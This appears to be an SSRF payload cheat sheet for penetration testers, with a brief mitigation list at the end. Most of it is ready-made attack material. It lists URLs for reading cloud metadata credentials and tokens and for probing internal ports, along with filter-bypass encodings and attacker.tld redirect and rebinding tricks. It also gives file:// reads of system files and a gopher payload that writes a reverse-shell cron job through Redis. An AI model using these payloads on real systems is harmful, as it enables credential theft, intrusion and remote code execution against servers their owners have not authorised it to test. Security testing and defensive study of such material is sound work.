# Server-Side Request Forgery (SSRF)

> SSRF lets an attacker induce the server-side application to make HTTP requests to an arbitrary domain — usually to internal systems unreachable from the internet.

## Summary

- [Tools](#tools)
- [Basic Payloads](#basic-payloads)
- [Cloud Metadata Endpoints](#cloud-metadata-endpoints)
- [Bypassing Filters](#bypassing-filters)
- [URL Schemes](#url-schemes)
- [Blind SSRF](#blind-ssrf)
- [Gopher Smuggling](#gopher-smuggling)
- [DNS Rebinding](#dns-rebinding)
- [Mitigation](#mitigation)
- [References](#references)

## Tools

- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [Interactsh](https://github.com/projectdiscovery/interactsh)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)

## Basic Payloads

```
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://internal.intranet.tld/
http://attacker.tld/      <- ensure outbound DNS / HTTP works first
```

Probe ports:

```
http://127.0.0.1:22
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
http://127.0.0.1:5984
```

## Cloud Metadata Endpoints

### AWS (IMDSv1 — still common in legacy)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://169.254.169.254/latest/user-data/
```

### AWS IMDSv2

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### Google Cloud

```
http://metadata.google.internal/computeMetadata/v1/    (header: Metadata-Flavor: Google)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (header: Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

### Oracle / Alibaba

```
http://192.0.0.192/latest/        (Oracle)
http://100.100.100.200/latest/    (Alibaba)
```

### Kubernetes

```
https://kubernetes.default.svc/api/v1/namespaces/default/pods
http://localhost:10255/pods/
http://localhost:10250/runningpods/   (kubelet)
```

## Bypassing Filters

### Encoded IPs

```
http://2130706433/          # decimal of 127.0.0.1
http://0x7f.0x0.0x0.0x1/    # hex
http://0177.0.0.1/          # octal
http://127.1/               # short form
http://127.0.0.1.nip.io/
http://localhost.attacker.tld/    # CNAME to 127.0.0.1
```

### IPv6 forms

```
http://[::]/
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### Userinfo trick

```
http://attacker.tld@127.0.0.1/
http://127.0.0.1#@attacker.tld/
http://127.0.0.1?@attacker.tld/
```

### Redirect bypass

Host `https://attacker.tld/r` that returns `302 Location: http://169.254.169.254/...`

### URL parser confusion

```
http://attacker.tld\@target.tld/
http://target.tld:80@attacker.tld/
http://target.tld#@attacker.tld/
```

(Different libraries parse host differently — sometimes the validator and the fetcher disagree.)

### Case / encoding

```
HTTP://127.0.0.1/
http%3A%2F%2F127.0.0.1
http://%31%32%37.0.0.1/
```

## URL Schemes

```
file:///etc/passwd
file:///c:/windows/win.ini
gopher://127.0.0.1:6379/_<smuggled commands>
dict://127.0.0.1:6379/info
ldap://127.0.0.1:389
sftp://127.0.0.1:22/
tftp://127.0.0.1:69/
imap://127.0.0.1:143/
pop3://127.0.0.1:110/
smtp://127.0.0.1:25/
ftp://127.0.0.1:21/
jar:http://127.0.0.1!/  (Java)
netdoc:///etc/passwd    (Java)
php://filter/convert.base64-encode/resource=index.php
```

## Blind SSRF

Use a collaborator domain (Burp Collaborator, Interactsh):

```
http://random-id.interactsh.tld/
```

Check DNS lookup AND HTTP request logs. Some apps only resolve DNS but never fetch.

### Probing via timing

If `http://internal.tld:22` hangs and `http://internal.tld:1` errors quickly → port 22 open.

## Gopher Smuggling

Gopher allows raw TCP — useful against Redis, Memcached, SMTP, MySQL, etc.

### Redis RCE example

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$XX%0d%0a<reverse_shell_cron>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

Use Gopherus to generate these automatically.

## DNS Rebinding

1. Validator resolves `attacker.tld` → `1.2.3.4` (allowed).
2. Fetcher (called milliseconds later) re-resolves → `127.0.0.1`.
3. Bypasses host allow-list.

Use [rbndr.us](https://rbndr.us/) or run [Singularity](https://github.com/nccgroup/singularity).

## Mitigation

- **Allow-list** outbound destinations, not block-list.
- **Resolve and pin** the IP at validation time, then fetch by IP (with `Host:` header set explicitly).
- Block link-local (`169.254.0.0/16`), loopback, RFC1918, multicast, and other reserved ranges.
- Disable unused URL schemes; only allow `http(s)`.
- Disable HTTP redirects, or re-validate each hop.
- On AWS, **force IMDSv2** and set hop-limit to 1.
- For internal HTTP services, require strong authentication (don't rely on network position).

## References

- [OWASP — SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
